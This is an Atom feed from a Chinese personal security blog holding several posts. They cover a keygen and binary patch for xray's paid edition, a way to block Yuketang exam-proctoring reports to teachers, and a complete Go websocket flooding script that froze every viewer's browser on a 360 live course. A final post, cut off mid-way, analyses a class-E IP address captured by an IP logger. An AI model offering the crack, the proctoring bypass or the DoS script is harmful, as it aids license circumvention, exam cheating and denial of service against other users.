<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zu1k</title>
  
  <subtitle>an interest-driven blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.lgf.im/"/>
  <updated>2020-06-18T05:55:26.007Z</updated>
  <id>https://blog.lgf.im/</id>
  
  <author>
    <name>zu1k</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xray社区高级版破解</title>
    <link href="https://blog.lgf.im/2020/xray-cracker.html"/>
    <id>https://blog.lgf.im/2020/xray-cracker.html</id>
    <published>2020-06-18T01:06:25.000Z</published>
    <updated>2020-06-18T05:55:26.007Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>首先感谢 长亭科技 提供 xray 这款非常方便非常好用的安全工具<br>俗话说：没有人破解的工具不是好工具<br>根据没有任何数据支持的统计，大部分安全研究人员使用的安全工具都是盗版<br>包括但不限于： IDA \ JEB \ BurpSuite \ Vmware</p></blockquote><p>前几天长亭官方有个活动，可以领2个月的xray社区高级版证书，正好趁这个机会逆向分析了一下xray的证书算法，写了一个证书生成器</p><p>因为xray证书用到了rsa算法，所以需要替换xray程序中的公钥，将该功能也集成在工具中了</p><p>相关算法分析文章后面有空再写，这里先放出写好的工具</p><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h3><p>使用 <code>-h</code> 查看帮助</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; .\xray-cracker -h</span><br><span class="line">破解xray高级版证书，使用 -h 参数查看使用帮助</span><br><span class="line"></span><br><span class="line">Usage of xray-cracker:</span><br><span class="line">  -c string</span><br><span class="line">        替换xray程序内置公钥，需要指定xray程序文件路径</span><br><span class="line">  -g string</span><br><span class="line">        生成一个永久license，需要指定用户名</span><br><span class="line">  -p string</span><br><span class="line">        解析官方证书，需要指定证书路径</span><br></pre></td></tr></table></figure><h3 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h3><p>使用 <code>-g username</code> 生成永久证书</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; .\xray-cracker -g &quot;我叫啥&quot;</span><br><span class="line">破解xray高级版证书，使用 -h 参数查看使用帮助</span><br><span class="line"></span><br><span class="line">证书已写入文件：xray-license.lic</span><br></pre></td></tr></table></figure><h3 id="破解xray"><a href="#破解xray" class="headerlink" title="破解xray"></a>破解xray</h3><p>使用 <code>-c path-to-xray</code> 修改xray内置公钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; .\xray-cracker -c .\xray_windows_amd64.exe</span><br><span class="line">破解xray高级版证书，使用 -h 参数查看使用帮助</span><br><span class="line"></span><br><span class="line">public key index: 16741321</span><br><span class="line">文件写入成功： .\xray_windows_amd64.exe</span><br></pre></td></tr></table></figure><blockquote><p>工具虽然是windows平台下运行，但是照样可以破解其他平台xray<br>目前xray最新版是1.0.0，现在全平台全版本通杀</p></blockquote><h2 id="破解效果"><a href="#破解效果" class="headerlink" title="破解效果"></a>破解效果</h2><p>使用修改版xray和永久证书后，效果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; .\xray_windows_amd64.exe version</span><br><span class="line"></span><br><span class="line"> __   __  _____              __     __</span><br><span class="line"> \ \ &#x2F; &#x2F; |  __ \      &#x2F;\     \ \   &#x2F; &#x2F;</span><br><span class="line">  \ V &#x2F;  | |__) |    &#x2F;  \     \ \_&#x2F; &#x2F;</span><br><span class="line">   &gt; &lt;   |  _  &#x2F;    &#x2F; &#x2F;\ \     \   &#x2F;</span><br><span class="line">  &#x2F; . \  | | \ \   &#x2F; ____ \     | |</span><br><span class="line"> &#x2F;_&#x2F; \_\ |_|  \_\ &#x2F;_&#x2F;    \_\    |_|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Version: 1.0.0&#x2F;62161168&#x2F;COMMUNITY-ADVANCED</span><br><span class="line">Licensed to 我叫啥, license is valid until 2099-09-09 08:00:00</span><br><span class="line"></span><br><span class="line">[xray 1.0.0&#x2F;62161168]</span><br><span class="line">Build: [2020-06-13] [windows&#x2F;amd64] [RELEASE&#x2F;COMMUNITY-ADVANCED]</span><br><span class="line">Compiler Version: go version go1.14.1 linux&#x2F;amd64</span><br><span class="line">License ID: 00000000000000000000000000000000</span><br><span class="line">User Name: 我叫啥&#x2F;00000000000000000000000000000000</span><br><span class="line">Not Valid Before: 2020-06-12 00:00:00</span><br><span class="line">Not Valid After: 2099-09-09 08:00:00</span><br></pre></td></tr></table></figure><h2 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h2><p>下载链接： <a href="/2020/xray-cracker/xray-cracker.zip" title="[xray-cracker.zip]">[xray-cracker.zip]</a></p><blockquote><p>解压密码请邮件联系我</p></blockquote><p>为了不至于过于泛滥，给工具增加了一个有效期，在 2021年以前有效</p><h2 id="工具源码"><a href="#工具源码" class="headerlink" title="工具源码"></a>工具源码</h2><p>暂未开源</p><p><a href="https://github.com/zu1k/xray-crack" target="_blank" rel="noopener">https://github.com/zu1k/xray-crack</a></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本次工作主要是探索golang逆向的基本方法，仅以学习逆向和证书生成算法为目的，如果你从本站下载了cracker工具，请在学习结束后立即删除</p><p>如果本篇文章侵犯了您的利益，请联系我删除</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;首先感谢 长亭科技 提供 xray 这款非常方便非常好用的安全工具&lt;br&gt;俗话说：没有人破解的工具不是好工具&lt;br&gt;根据没有任何数据支持的统计，大部分安全研究人员使用的安全工具都是盗版&lt;br&gt;包括但不限于： IDA \ JEB \ BurpSuit
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="cracker" scheme="https://blog.lgf.im/tags/cracker/"/>
    
      <category term="keygen" scheme="https://blog.lgf.im/tags/keygen/"/>
    
      <category term="xray" scheme="https://blog.lgf.im/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>屏蔽雨课堂在线考试异常上报</title>
    <link href="https://blog.lgf.im/2020/yuketang-exam-block-report.html"/>
    <id>https://blog.lgf.im/2020/yuketang-exam-block-report.html</id>
    <published>2020-06-12T12:23:46.000Z</published>
    <updated>2020-06-18T05:55:26.007Z</updated>
    
    <content type="html"><![CDATA[<p>学校又开始推雨课堂的在线考试功能了，在老师的配合下稍微分析了一下</p><p>因为都是js代码，没有用wasm，分析还是比较简单的</p><h2 id="切屏检测"><a href="#切屏检测" class="headerlink" title="切屏检测"></a>切屏检测</h2><p>考试过程中，如果切换浏览器标签，返回后会有一个切屏警告，并且老师那边也会有切屏记录</p><p>通过实验发现如果不切换浏览器标签，使用另一个浏览器窗口或者切换其他软件都不会触发这个记录</p><p>相关代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">onchange: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">document</span>.hidden || </span><br><span class="line">        <span class="number">0</span> != e.onlineProctor || </span><br><span class="line">        e.getCacheResult(), e.onlineProctor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">document</span>.hidden) &#123;</span><br><span class="line">            e.time1 = <span class="keyword">new</span> <span class="built_in">Date</span>, e.uploadUnnormal(<span class="number">12</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> x &amp;&amp; clearTimeout(x), x = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            e.$alert(<span class="string">""</span>, &#123;</span><br><span class="line">                customClass: <span class="string">"alertMsg"</span>,</span><br><span class="line">                showClose: !<span class="number">1</span>,</span><br><span class="line">                message: <span class="string">"系统监测到你切出了考试页面&lt;br/&gt;我们会将此行为报告你的老师"</span>,</span><br><span class="line">                dangerouslyUseHTMLString: !<span class="number">0</span>,</span><br><span class="line">                confirmButtonText: <span class="string">"继续考试"</span>,</span><br><span class="line">                center: !<span class="number">0</span>,</span><br><span class="line">                callback: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;&#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;, <span class="number">1</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span>;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>没有看代码之前我还猜想检查切屏可以通过focus来检查，看了代码后发现使用的是vue的 onchange 进行触发，然就在方法内检查document是否hidden</p><p>这样是无法检测到切换不同应用的，简直是自欺欺人啊</p><p>注意到检测到切标签后会触发 <code>e.uploadUnnormal(12)</code> 方法，进去看一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uploadUnnormal: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">this</span>.$axios.post(API.feed_add, &#123;</span><br><span class="line">        exam_id: <span class="keyword">this</span>.exam_id,</span><br><span class="line">        action: t</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;&#125;).catch(<span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">        e.$message.error(<span class="string">"发生错误"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>API.feed_add1</code> 是 <code>/online_proctor/stu/monitor/feed/add</code> 这个路径</p><p>也就是说切标签后会 POST 一个标号为12的action记录，抓包后也发现的确如此，也仅仅而已</p><h2 id="照片上传"><a href="#照片上传" class="headerlink" title="照片上传"></a>照片上传</h2><p>查看请求发现图片是先上传到七牛云，然后将返回的连接发给服务器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">handleCapture: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">this</span>,</span><br><span class="line">        e = <span class="keyword">this</span>.context,</span><br><span class="line">        n = <span class="keyword">this</span>.$refs.video;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isexam) </span><br><span class="line">        e.drawImage(n, <span class="number">0</span>, <span class="number">0</span>, <span class="number">160</span>, <span class="number">120</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (e.drawImage(n, <span class="number">0</span>, <span class="number">0</span>, <span class="number">240</span>, <span class="number">180</span>), <span class="keyword">this</span>.reTake) </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">void</span> <span class="keyword">this</span>.$emit(<span class="string">"changeReTake"</span>, !<span class="number">1</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e = t.$refs.canvas.toDataURL(<span class="string">"image/jpeg"</span>, <span class="number">1</span>),</span><br><span class="line">            n = <span class="built_in">Object</span>(u.b)(e, <span class="built_in">Date</span>.now());</span><br><span class="line">        t.upload(n).then(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> n = e &amp;&amp; e.url;</span><br><span class="line">            t.image_url = n, </span><br><span class="line">            t.$emit(<span class="string">"changeReTake"</span>, !<span class="number">0</span>), </span><br><span class="line">            t.$emit(<span class="string">"changeCanEnter"</span>, !<span class="number">0</span>), </span><br><span class="line">            t.isexam &amp;&amp; t.postRecord(n, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">upload: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = c.a.qiniuDomain;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> s.a(<span class="function"><span class="keyword">function</span> (<span class="params">n, r</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> i = &#123;</span><br><span class="line">            next: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">                t.total.percent</span><br><span class="line">            &#125;,</span><br><span class="line">            error: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">                r(&#123;</span><br><span class="line">                    url: <span class="string">""</span></span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;,</span><br><span class="line">            complete: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> r = e + <span class="string">"/"</span> + <span class="built_in">encodeURIComponent</span>(t.key);</span><br><span class="line">                n(&#123;</span><br><span class="line">                    url: r</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        c.a &amp;&amp; c.a.upload(t, i, <span class="string">"image"</span>, !<span class="number">1</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">postRecord: <span class="function"><span class="keyword">function</span> (<span class="params">t, e, n, r, i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = &#123;</span><br><span class="line">        exam_id: <span class="keyword">this</span>.examid,</span><br><span class="line">        image_url: t,</span><br><span class="line">        label: e,</span><br><span class="line">        event_group_id: n,</span><br><span class="line">        operator_id: r,</span><br><span class="line">        action: i</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">this</span>.$axios.post(API.upload_photograph, o)</span><br><span class="line">                .then(<span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;&#125;)</span><br><span class="line">                .catch(<span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h2><p>那啥，就几个有用的url，反正都是后台请求，当做广告拦截了就行，这样老师那边就没有切屏警告和异常照片了</p><ul><li>changjiang-exam.yuketang.cn/online_proctor/stu/monitor/feed/add</li><li>changjiang-exam.yuketang.cn/online_proctor/stu/photograph/add</li><li>upload.qiniup.com</li><li>upload-z1.qiniup.com</li><li>upload-z2.qiniup.com</li><li>upload-na0.qiniup.com</li><li>upload-as0.qiniup.com</li></ul><p>插件我用的AdblockPLUS，手动添加几条规则就行，亲测好用</p>]]></content>
    
    <summary type="html">
    
      学校使用雨课堂进行在线考试，测试后发现会检测切屏并拍照上传，通过对js代码的分析理清雨课堂监测切屏和上传异常照片的方法，通过插件进行屏蔽
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="exam" scheme="https://blog.lgf.im/tags/exam/"/>
    
      <category term="雨课堂" scheme="https://blog.lgf.im/tags/%E9%9B%A8%E8%AF%BE%E5%A0%82/"/>
    
  </entry>
  
  <entry>
    <title>利用360直播课评论区对用户浏览器dos攻击</title>
    <link href="https://blog.lgf.im/2020/dos-attack-on-360-university-user.html"/>
    <id>https://blog.lgf.im/2020/dos-attack-on-360-university-user.html</id>
    <published>2020-05-29T06:01:45.000Z</published>
    <updated>2020-06-18T05:55:25.991Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错</p><p>对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数50次限制，但是评论总数没有限制</p><p>并且，后端性能非常好，能够即时处理所有评论并通过websocket发送给所有直播课的听众</p><p>用户的浏览器效率比较低，无法及时处理后端返回的所有评论，从而导致浏览器卡死，如此只需要一个用户不断发送评论包，所有用户都会受到dos攻击</p><p>评论代码如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"flag"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"net/url"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"os/signal"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/gorilla/websocket"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addr = flag.String(<span class="string">"addr"</span>, <span class="string">"trans.college.360.cn"</span>, <span class="string">"http service address"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">flag.Parse()</span><br><span class="line">log.SetFlags(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">interrupt := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(interrupt, os.Interrupt)</span><br><span class="line"></span><br><span class="line">u := url.URL&#123;</span><br><span class="line">Scheme: <span class="string">"wss"</span>, </span><br><span class="line">Host: *addr, </span><br><span class="line">Path: <span class="string">"/ws"</span>, </span><br><span class="line">RawQuery: <span class="string">"live_course_id=10114"</span></span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">"connecting to %s"</span>, u.String())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header := <span class="built_in">make</span>(http.Header)</span><br><span class="line">header[<span class="string">"Origin"</span>] = []<span class="keyword">string</span>&#123;<span class="string">"https://admin.college.360.cn"</span>&#125;</span><br><span class="line">header[<span class="string">"User-Agent"</span>] = []<span class="keyword">string</span>&#123;<span class="string">"Chrome/80.0.3987.122"</span>&#125;</span><br><span class="line">header[<span class="string">"Cookie"</span>] = []<span class="keyword">string</span>&#123;<span class="string">"your cookie"</span>&#125;</span><br><span class="line"></span><br><span class="line">dialer := websocket.DefaultDialer</span><br><span class="line">dialer.EnableCompression = <span class="literal">true</span></span><br><span class="line">c, _, err := dialer.Dial(u.String(), header)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(<span class="string">"dial:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> c.Close()</span><br><span class="line"></span><br><span class="line">done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(done)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">_, message, err := c.ReadMessage()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"read:"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">"recv: %s"</span>, message)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">ticker := time.NewTicker(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">defer</span> ticker.Stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> &lt;-ticker.C:</span><br><span class="line">err := c.WriteMessage(websocket.TextMessage, []<span class="keyword">byte</span>(</span><br><span class="line"><span class="string">"&#123;\"cmd\":\"newMessage\",\"message\":\"感谢360\"&#125;"</span></span><br><span class="line">))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"write:"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> &lt;-interrupt:</span><br><span class="line">log.Println(<span class="string">"interrupt"</span>)</span><br><span class="line">err := c.WriteMessage(</span><br><span class="line">websocket.CloseMessage, </span><br><span class="line">websocket.FormatCloseMessage(</span><br><span class="line">websocket.CloseNormalClosure, <span class="string">""</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"write close:"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-done:</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(time.Second):</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能是360也发现这个dos了，过了不到一个周便修复了，增加了评论速率的限制</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错&lt;/p&gt;
&lt;p&gt;对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数50次限制，但是评论总数没有限制&lt;/p&gt;
&lt;p&gt;并且，后端性能非常好，能够即时处理所有评论并通过websocket发送给
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="dos" scheme="https://blog.lgf.im/tags/dos/"/>
    
  </entry>
  
  <entry>
    <title>一个来自保留IP地址的连接</title>
    <link href="https://blog.lgf.im/2020/why-reveice-connection-from-class-e-ip.html"/>
    <id>https://blog.lgf.im/2020/why-reveice-connection-from-class-e-ip.html</id>
    <published>2020-05-25T07:22:09.000Z</published>
    <updated>2020-06-18T05:55:26.003Z</updated>
    
    <content type="html"><![CDATA[<p>昨天看了一篇文章，文章最后使用IP logger进行钓鱼，最后记录下来的IP地址让我大跌眼镜</p><p>万万没有想到，记录下来的IP地址竟然是是 244.242.105.51</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/why-reveice-connection-from-class-e-ip/ip-logger.png" loading="lazy" class="" title="[IP Logger]"><p>这可是一个E类IP地址，是属于保留地址，是未来用来做ip研究用的，目前并没有开放使用啊</p><p>考虑到文章中是对一个地下黑客组织进行钓鱼，所以我有理由相信，这个访问记录是通过某种高超的我从来没有听说过的手段实现的</p><p>IP Logger为啥会记录到这样一个IP的访问呢？ 这个问题一直到现在都在困扰我</p><p>下面记录一下我对这个的分析</p><h2 id="大端？小端？"><a href="#大端？小端？" class="headerlink" title="大端？小端？"></a>大端？小端？</h2><p>众所周知计算机程序根据cpu架构和操作系统种类不同，数据在内存中存放有大端序和小端序两种情况，这个顺序叫做主机序</p><p>而网络传输需要在不同主机序的计算机之间兼容，所以又规定了一个网络序，规定网络传输一律使用大端序</p><p>文章中作者猜测是访问者使用的主机是小端序的，所以会又这样一个记录</p><p>我个人认为这个猜测不成立</p><p>因为一般ip层报文都是由操作系统网络栈来构造的，操作系统自身不会犯忘记转换成网络序的错误</p><p>即使是访问者技术高超自己写代码构造的ip包，那源ip是E类ip地址，返程的ip包根本没有路由啊，这样子连tcp连接都建立不了，更不要谈ip logger记录下浏览器的user-agent</p><h2 id="Tor"><a href="#Tor" class="headerlink" title="Tor?"></a>Tor?</h2><p>考虑到记录下来的user-agent与tor浏览器的一致，并且对方是黑客组织，使用tor也是非常普遍，所以分析一下通过tor能不能实现伪造自己的ip为E类ip</p><p>tor连接的流程中，每个tor relay不会知道完整的路由路径，只知道上一个节点与下一个节点，并且这个路由是在应用层实现的，如果黑客控制了某些tor relay，通过这些relay能不能实现这个伪造？</p><h3 id="提供onion-service"><a href="#提供onion-service" class="headerlink" title="提供onion service"></a>提供onion service</h3><p>如果ip logger提供onion service，那他记录下来的ip应该是 会合节点的ip</p><p>通过我上一篇博客学习的内容可以知道，这个会合节点是由客户端选择的，所以我们假设黑客这里选择了自己控制的某个tor 